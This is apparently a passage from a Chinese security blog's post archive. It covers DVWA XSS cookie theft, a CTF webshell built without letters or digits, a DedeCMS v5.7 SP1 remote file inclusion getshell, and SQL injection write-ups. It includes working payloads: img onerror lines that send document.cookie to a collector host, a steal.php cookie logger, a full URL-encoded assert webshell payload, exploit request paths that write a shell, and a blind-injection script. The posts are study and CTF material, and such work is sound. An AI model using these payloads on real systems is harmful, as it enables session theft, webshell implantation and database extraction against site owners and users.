src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/script&gt; 将链接发给该网站下的受害者，受害者点击时就会加载远程服务器（这里是win7）的cookie.js脚本这里要提一点，用src加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据 这时，win7的数据库就接收到了cookie medium级别代码如下 &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 可看出代码将我们输入内容中的&lt;script&gt;标签替换为了空但是str_replace这个函数是不区分大小写的，而且只替换一次所以我们构造payload &lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/script&gt; &lt;SCRIPT&gt;alert(&quot;xss&quot;)&lt;/SCRIPT&gt; 均可以弹框，同样的，插入 &lt;scr&lt;script&gt;ipt src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/script&gt; &lt;SCRIPT src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/SCRIPT&gt; 加载远程脚本steal.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;dvwacookie&quot;,$conn); if(isset($_GET[&apos;data&apos;])) { $sql=&quot;insert into medium(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else if(isset($_POST[&apos;data&apos;])) { $sql=&quot;insert into medium(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else { $sql=&quot;select * from medium&quot;; $result=mysql_query($sql,$conn); while($row=mysql_fetch_array($result)) { echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;; } mysql_close(); } ?&gt; 将获取的cookie加入medium表，结果如下 high 级别代码如下 &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Get input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; 发现添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码，构造payload &lt;img src=# onerror=alert(&quot;xss&quot;)&gt; 通过加载一个不存在的图片出错出发javascript onerror事件,继续弹框，证明出来有xss，这样的payload还有很多在xss的位置插入 &lt;img src=# onerror=(location.href=&quot;http://192.168.50.150/dvwaxss/steal.php?data=&quot;+document.cookie)&gt; 通过触发onerror事件跳转链接到远程服务器的steal.php，同时以GET带上当前的cookie但是输入被过滤了只剩下Hello .cookie)&gt;what！？不应该啊,在这被坑了好久，终于发现问题所在 &lt;img SrC=# oneRror=(locatIon.href=&quot;httP://192.168.50.150/dvwaxss/steal.php?data=&quot;+documenT.cookie)&gt; 注意观察我们所插入的代码，我表明的大写部分，竟然构成了一个script，所以符合代码的正则，从而过滤掉了，这实在是坑啊。。。那我们将插入代码中的i进行html编码 &lt;img src=# onerror=(locat&amp;#x69;on.href=&quot;http://192.168.50.150/dvwaxss/steal.php?data=&quot;+document.cookie)&gt; 我们提交这段代码后绕过了过滤，然后浏览器进行了html解码，然后就是之前一样的过程，触发onerror事件，对远程服务器的steal.php发送我们的cookie steal.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;dvwacookie&quot;,$conn); if(isset($_GET[&apos;data&apos;])) { $sql=&quot;insert into high(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else if(isset($_POST[&apos;data&apos;])) { $sql=&quot;insert into high(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else { $sql=&quot;select * from high&quot;; $result=mysql_query($sql,$conn); while($row=mysql_fetch_array($result)) { echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;; } mysql_close(); } ?&gt; 远程服务器接收到了cookie的信息","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"湖湘杯2017网络安全技能大赛部分题writeup","slug":"hxbctf2017","date":"2017-11-25T16:01:10.287Z","updated":"2018-06-04T15:01:57.322Z","comments":true,"path":"2017/11/26/hxbctf2017/","link":"","permalink":"http://yoursite.com/2017/11/26/hxbctf2017/","excerpt":"","text":"湖湘杯2017网络安全技能大赛部分题writeup战队:nyisec,通过这次比赛还是学到了不少姿势，在这里记录一下 题目:web200解题思路:题目提醒是上传题,但是弄了半天，原来是文件包含,用php://filter/convert.base64-encode/resource就可以读取文件源码，我们读取flag的源码,使用php://filter/convert.base64-encode/resource=flag,读出的是一串base64编码 解码一下就是flag，flag如图 题目:web300解题思路:题目没有绕什么弯，根据源码可以看出只要写了shell就能得到flag，我们将一句话写到get参数content后面，然后就会写入文件，但是根据题目我们只能用$ , &#39; , ( , ) , + , . , ; , = , [ , ] , _ , { , }这几个字符写webshell，别的字符都被过滤掉了，在网上搜了一下，p牛曾经写过一篇博客，根据php的特性如果要将一个空字符串和一个空数组连接起来的话就能生成一个字符串，值为Aarry，再用题目允许的字符将其中两个不相等的字符用==进行比较我们可以得到0，从而得到Aarry的第一个字符A，我们对A进行自加操作就能生成任意字母，从而写出符合要求的webshell，下面给出代码 $_=[].&apos;&apos;;$_=$_[&apos;(&apos;==&apos;)&apos;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 上面的代码很好的表示出了ASSERT($_POST[_]);一句话木马，密码为_. 因为+出现在url中会被当作是空格从而被waf过滤掉,所以将代码进行url编码后放到content参数后提交 最终payload http://114.215.133.202:10080/?content=%24%5f%3d%5b%5d%2e%27%27%3b%24%5f%3d%24%5f%5b%27%28%27%3d%3d%27%29%27%5d%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b 点击我们的shell链接出现这样的情况就是上传成功 用菜刀连接就能看到flag.phpflag 给出p牛的文章链接一些不包含数字和字母的webshell","categories":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"dedecmsv57 sp1远程文件包含漏洞","slug":"dedegetshell","date":"2017-11-21T13:46:28.820Z","updated":"2018-06-04T14:57:52.081Z","comments":true,"path":"2017/11/21/dedegetshell/","link":"","permalink":"http://yoursite.com/2017/11/21/dedegetshell/","excerpt":"利用dedecmsv57 sp1远程文件包含漏洞getshell比较早的一个漏洞,利用apache解析漏洞,可远程文件包含getshell","text":"利用dedecmsv57 sp1远程文件包含漏洞getshell比较早的一个漏洞,利用apache解析漏洞,可远程文件包含getshell 利用条件服务器为apache,dedecms版本为dedecmsv57 sp1,攻击者要有一台自己的远程服务器 漏洞分析漏洞文件位置为/install/index.php.bak else if($step==11) { require_once(&apos;../data/admin/config_update.php&apos;); $rmurl = $updateHost.&quot;dedecms/demodata.{$s_lang}.txt&quot;; $sql_content = file_get_contents($rmurl); $fp = fopen($install_demo_name,&apos;w&apos;); if(fwrite($fp,$sql_content)) echo &apos;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&apos;; else echo &apos;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&apos;; unset($sql_content); fclose($fp); exit(); } 该文件是dedecms安装完成后生成的备份文件,这会将远程服务器$updateHost下的dedecms/demodata.{$s_lang}.txt文件内容写入当前服务器的$install_demo_name文件中,当中有三个关键的可控变量,$updateHost,$s_lang,$install_demo_name $updateHost来源于../data/admin/config_update.php文件 &lt;?php /** * 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询 * * @version $Id: config_update.php 1 11:36 2011-2-21 tianya $ * @package DedeCMS.Administrator * @copyright Copyright (c) 2007 - 2010, DesDev, Inc. * @license http://help.dedecms.com/usersguide/license.html * @link http://www.dedecms.com */ //更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询 $updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;; $linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;; 如果我们构造payload为 /install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 这时$rmurl的值就会为http://updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt,这时这个文件明显是不存在的,于是便会将../data/admin/config_update.php的内容写为空 我们在自己的服务器下创建dedecms/demodata.a.txt文件,里面写入php一句话木马继续构造payload为 /install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=shell.php&amp;updateHost=http://你的服务器地址/ 这时$rmurl的值为http://你的服务器地址/dedecms/demodata.a.txt,于是便可以把我们自己服务器上的一句话写到/install目录下的shell.php中,从而getshell,webshell地址为`/install/shell.php`","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://yoursite.com/tags/漏洞利用/"}]},{"title":"通过lctf2017 writeup get思路","slug":"lctf2017","date":"2017-11-20T09:09:32.344Z","updated":"2018-06-04T15:09:45.275Z","comments":true,"path":"2017/11/20/lctf2017/","link":"","permalink":"http://yoursite.com/2017/11/20/lctf2017/","excerpt":"","text":"通过lctf2017的一道注入题学到的新姿势偶然在群里看到别人发的lctf2017 writeup,这个比赛自己没做,不过看了这篇writeup后照着思路做了一下题,学到了不少新的思路和姿势,在这里记录一下 原文链接 url:http://182.254.246.93/entrance.php 这道题的思路首先是根据源代码中的提示判断这是一道注入题,注入点在pro_id上 &lt;form method =&quot;POST&quot; action=&quot;entrance.php&quot;&gt; &lt;p&gt;Do you want to know their secrets?&lt;/p&gt; &lt;p&gt;id:&lt;input id=&quot;pro_id&quot; name=&quot;pro_id&quot; type=&quot;text&quot; /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/p&gt; &lt;/form&gt; &lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt; &lt;/body&gt; &lt;/html&gt; 根据提示进行union查询,发现一些关键字被waf拦截了,过滤的关键字有database(),version(),information_schema等,然而很多注入都是基于information_schema这个数据库的,但是通过pcat师傅的文章,学到了一种新的字姿势 先在post参数pro_id上进行order by判断列数,发现当前数据表列数为4,然后构造payload pro_id=1 union select 1,2,3,4 from test 由于test表不存在,于是会爆出错误,错误中出现当前数据库的名字 Table &apos;youcanneverfindme17.test&apos; doesn&apos;t exist 发现可以报错后,尝试用报错函数得到更多的数据,发现updatexml,extractvalue等XPATH报错函数对参数类型进行了严格的控制均不能使用,会出现Only constant XPATH queries are supported的提示,那么构造payload pro_id=1 and exp(~(select pro_id)) 通过一个整数溢出的错误报出当前数据库的名字和表名,列名pro_id是通过post参数猜测出来的 DOUBLE value is out of range in &apos;exp(~((select `youcanneverfindme17`.`product_2017ctf`.`pro_id`)))&apos; 接下来是爆出表下的列名,构造payload pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id))c) 这条语句通过pro_id字段连接两个相同的表,将会产生相同的列名,由于一个数据表不能有相同的列名,就会爆出Duplicate column name的错误，同时爆出列的名字,所以我们通过对一个不符合要求的表进行子查询,就会报错 Duplicate column name &apos;pro_name&apos; 我们可以通过报出的错误信息遍历列名,payload pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id,pro_name))c) 继续报错 Duplicate column name &apos;owner&apos; 构造payload遍历 pro_id=0 and (select * from (select * from youcanneverfindme17.product_2017ctf a join youcanneverfindme17.product_2017ctf b using(pro_id,pro_name,owner))c) 回显出了和提示中符合的列名 Duplicate column name &apos;d067a0fa9dc61a6e&apos; 但是从product_2017ctf表中对d067a0fa9dc61a6e字段内容进行union查询时发现d067a0fa9dc61a6e也被waf过滤了,从上篇文章中自己学到了一个很有意思的姿势,方法是盲注,pro_id=3的product name和题目连接的名字很相似,都为entrance,那么我们可以猜测flag的后半部分在pro_id为3的记录中,,因为d067a0fa9dc61a6e列为第四列,我们要提取他当中的内容,可以用union select 1，2，3，字符串进行盲注,通过order by desc降序,由于mysql比较字符串大小是根据字符ascii码比较的,所以如果我们的字符串的ascii码的值小于flag的ascii值,union查询的第一条记录便为union关键字前的查询结果,否则就会显示select 1,2,3,字符串的结果,也就是显示2(显示位在2上),所以通过显示结果的不同可以进行盲注,编写脚本 import requests import string url=&quot;http://182.254.246.93/entrance.php&quot; list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127] flaghead=&quot;d067a0fa9dc61a6e&quot; flagtail=&quot;&quot; while 1: for i in list: payload={&quot;pro_id&quot;:&quot;3 union select 1,2,3,%s order by 4 desc&quot;%(&quot;0x&quot;+(flagtail+i).encode(&quot;hex&quot;))} html=requests.post(url=url,data=payload).content if html.find(&quot;nextentrance&quot;)==-1: flagtail+=chr(ord(i)-1) print flagtail l2=len(flagtail) break else: pass if flagtail.split(&quot;.&quot;)[-1]==&quot;PHP&quot;: break flag=flaghead+flagtail.lower() print flag 得出flag C:\\Users\\I&apos;m possible\\Desktop&gt;getflag.py 7 71 719 7195 7195C 7195CA 7195CA9 7195CA99 7195CA996 7195CA9969 7195CA99696 7195CA99696B 7195CA99696B5 7195CA99696B5A 7195CA99696B5A8 7195CA99696B5A89 7195CA99696B5A896 7195CA99696B5A896. 7195CA99696B5A896.P 7195CA99696B5A896.PH 7195CA99696B5A896.PHP d067a0fa9dc61a6e7195ca99696b5a896.php flag为下一关地址","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"mysql报错注入总结","slug":"error-base","date":"2017-11-12T08:43:59.119Z","updated":"2018-06-04T15:00:39.608Z","comments":true,"path":"2017/11/12/error-base/","link":"","permalink":"http://yoursite.com/2017/11/12/error-base/","excerpt":"mysql报错注入总结最近又深刻的研究了一下mysql的报错注入,发现很多值得记录的东西,于是写了这篇博客做一个总结,目的是为了更深刻的理解报错注入","text":"mysql报错注入总结最近又深刻的研究了一下mysql的报错注入,发现很多值得记录的东西,于是写了这篇博客做一个总结,目的是为了更深刻的理解报错注入 报错注入原因及分类既然是研究报错注入,那我们先要弄明白为什么我们的注入语句会导致数据库报错,报错的原因我自己总结了一下,有以下几点 重复数据报错,这里的重复主要有两个方面,其中之一是基于主键的唯一性:一个表主键必须是唯一的,如果一个表尝试生成两个相同的主键，就会爆出Duplicate entry的主键重复错误,于是根据这种报错就产生了floor(rand(0)*2)等注入手法,另外一个就是基于列名的唯一性,如果我们在一个表中构造了两个相同的列名,就会产生Duplicate column name的错误,报错方法通常有NAME_CONST,或者利用join和using关键字连接同一个表创建子查询进行报错,这个方法从lctf2017 pcat师傅的writeup中学到的,在我的另一篇文章中会提到 基于数据类型不一致而产生的报错:mysql的一些函数参数要求的是什么数据类型,如果数据类型不符合,自然就会报错,这种报错也是相对容易理解的,根据这种特性产生的报错注入有updatexml,extractvalue等注入手法 基于BIGINT溢出错误的SQL注入,根据超出最大整数溢出产生的错误,这类报错注入是在mysql5.5.5版本后才产生的,5.5.5版本前并不会因为整数溢出而报错,这种注入自己在phpstudy上试了试,mysql版本为5.5.53,虽然报错了但是并没有爆出信息,以后研究出来再补充 其他报错,企业级代码审计这本书上看到的,一些mysql空间函数geometrycollection(),multipoint(),polygon(),multipolygon(),linestring(),multilinestring(),通过这些报错会产生Illegal non geometric的错误,里面同时包含了我们构造查询语句的信息 原理分析接下来对上面列出的一些报错注入一个个进行分析 基于主键值重复floor(rand(0)*2):我们在进行报错注入时用的相对较多的方法,网上给出的报错语句大部分是这样的 id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 自己因为这个语句纠结了一段时间,比如为什么要floor(rand(0)*2),为什么要用到information_schema.tables这个表,看了很多相关文章才明白报错的原理,先看rand()这个函数,这个函数都知道是产生随机数的,但是当rand(0)被计算多次时它所产生的值是有规律的,我们以information_schema.tables这个表进行示范,因为它里面的数据多,别的表也可以,只要数据量够多,这样可以使rand(0)计算多次,便于观察,为了更便于观察,我们取前30条记录,查询语句 mysql&gt; select rand(0) from information_schema.tables limit 0,30; +---------------------+ | rand(0) | +---------------------+ | 0.15522042769493574 | | 0.620881741513388 | | 0.6387474552157777 | | 0.33109208227236947 | | 0.7392180764481594 | | 0.7028141661573334 | | 0.2964166321758336 | | 0.3736406931408129 | | 0.9789535999102086 | | 0.7738459508622493 | | 0.9323689853142658 | | 0.3403071047182261 | | 0.9044285983819781 | | 0.501221708488857 | | 0.7928227780319962 | | 0.4604487954270549 | | 0.9237756737729308 | | 0.23753201331713425 | | 0.4163330760005238 | | 0.3690693707848614 | | 0.5963476566563805 | | 0.874530201660963 | | 0.5836080690693185 | | 0.29444977109734877 | | 0.7214246790124333 | | 0.7237741125037652 | | 0.4545965562151713 | | 0.10166047429820567 | | 0.14451273357915947 | | 0.4175822757348253 | +---------------------+ 30 rows in set (0.05 sec) 通过多次测试观察可以发现规律,每次执行sql语句多次计算rand(0)时,rand(0)产生的值是总是固定的,不管执行多少次语句,多次计算的rand(0)的前30条总是和上面得计算结果一样,那么可以做出结论之后的结果也总是一样,观察上述计算结果,看似杂乱的数值其实都有着一个范围界限,那就是0~0.5,0.5~1,我们将rand(0)*2再观察一下 mysql&gt; select rand(0)*2 from information_schema.columns limit 0,30; +---------------------+ | rand(0)*2 | +---------------------+ | 0.3104408553898715 | | 1.241763483026776 | | 1.2774949104315554 | | 0.6621841645447389 | | 1.4784361528963188 | | 1.4056283323146668 | | 0.5928332643516672 | | 0.7472813862816258 | | 1.9579071998204172 | | 1.5476919017244986 | | 1.8647379706285316 | | 0.6806142094364522 | | 1.8088571967639562 | | 1.002443416977714 | | 1.5856455560639924 | | 0.9208975908541098 | | 1.8475513475458616 | | 0.4750640266342685 | | 0.8326661520010477 | | 0.7381387415697228 | | 1.192695313312761 | | 1.749060403321926 | | 1.167216138138637 | | 0.5888995421946975 | | 1.4428493580248667 | | 1.4475482250075304 | | 0.9091931124303426 | | 0.20332094859641134 | | 0.28902546715831895 | | 0.8351645514696506 | +---------------------+ 30 rows in set (0.69 sec) 此时界限分隔值变成了1,数值都是零点几的小数和一点几的小数,于是用floor处理一下 mysql&gt; select floor(rand(0)*2) from information_schema.columns limit 0,30; +------------------+ | floor(rand(0)*2) | +------------------+ | 0 | | 1 | | 1 | | 0 | | 1 | | 1 | | 0 | | 0 | | 1 | | 1 | | 1 | | 0 | | 1 | | 1 | | 1 | | 0 | | 1 | | 0 | | 0 | | 0 | | 1 | | 1 | | 1 | | 0 | | 1 | | 1 | | 0 | | 0 | | 0 | | 0 | +------------------+ 于是就有了floor(rand(0)*2),同样的,每次执行多次floor(rand(0)*2),所得的结果也总是这样固定,我们只看前6个数字,总是0,1,1,0,1,1这样的顺序,后面的数也是如此有着自己的顺序 接下来我们构造一个sql语句,它可以报出Duplicate的错误 mysql&gt; select count(*) from information_schema.tables group by floor(rand(0)*2); ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;group_key&apos; 分析这条语句,当进行count(*),group by聚合函数分组计算时,mysql会创建一个虚拟表,虚拟表由主键列和count(*)列两列组成,同时floor(rand(0)*2)这个值会被计算多次,这一点很重要,计算多次是指在查询数据表数据时,进行一次floor(rand(0)*2),如果虚拟表中不存在此数据时,那么在往虚拟表插入数据时,floor(rand(0)*2)将会再被计算一次。接下来分析,首先查询数据表第一条记录时第一次使用floor(rand(0)*2)，计算出来值为0,查询虚拟表发现0这个主键不存在,于是再次计算floor(rand(0)*2)结果为1,将1作为主键插入虚拟表,这时主键1的count(*)值为1,接下来查询数据表第二条记录时使用floor(rand(0)*2),计算结果为1,然后查询虚拟表,发现1的键值存在,于是count(*)的值加1,然后查询数据表第三条记录时使用floor(rand(0)*2)，计算出来值为0,查询虚拟表,发现0的键值不存在,于是再一次计算floor(rand(0)*2),结果为1,当尝试将1插入虚拟表中时,发现主键1已经存在,所以报出主键重复的错误,也就是Duplicate entry &#39;1&#39; for key &#39;group_key&#39;这个错误,整个过程中查询了information_schema.tables这个表3条记录发生报错,这也是报错为什么需要数据表的记录多到至少为3条的原因,也是为什么选择information_schema.tables表的原因,因为这个表中的记录一定大于三条,由此可知我们其实还以选择information_schema.columns,information_schema.schemata等表 下面构造语句 mysql&gt; select count(*) from information_schema.tables group by concat(floor(rand(0)*2),0x3a,user()); ERROR 1062 (23000): Duplicate entry &apos;1:root@localhost&apos; for key &apos;group_key&apos; 是不是看着很眼熟,没错，这就是我们在开头给出的那个复杂的语句,只不过开头的那个加了个子查询,其实and后的括号里直接写这个语句也能达到一样的效果 mysql&gt; select * from user where id=1 and (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),0x3a,user())); ERROR 1062 (23000): Duplicate entry &apos;1:root@localhost&apos; for key &apos;group_key&apos; 把user()换成其他查询语句,就可以注入出别的数据 基于数据类型的不一致updatexml(1,XPATH,1)函数的第二个参数要求为XPATH格式,如果我们把它改为字符串格式,那么就会爆出XPATH syntax error的错误,于是构造sql语句 mysql&gt; select * from user where id=1 and updatexml(1,(concat(1,user())),1); ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos; 利用concat函数返回字符串产生报错,同样的函数还有extractvalue(1,XPATH) mysql&gt; select * from user where id=1 and extractvalue(1,(concat(1,user()))); ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"科学上网,vultr vps主机上shadowsocks的搭建","slug":"shadowsocks","date":"2017-11-08T08:51:26.804Z","updated":"2018-06-04T15:12:50.700Z","comments":true,"path":"2017/11/08/shadowsocks/","link":"","permalink":"http://yoursite.com/2017/11/08/shadowsocks/","excerpt":"Vultr vps主机上搭建shadowsocks简介介绍了如何搭建shadowsocks科学上网，将我的翻墙方法分享给各位需要的小伙伴","text":"Vultr vps主机上搭建shadowsocks简介介绍了如何搭建shadowsocks科学上网，将我的翻墙方法分享给各位需要的小伙伴 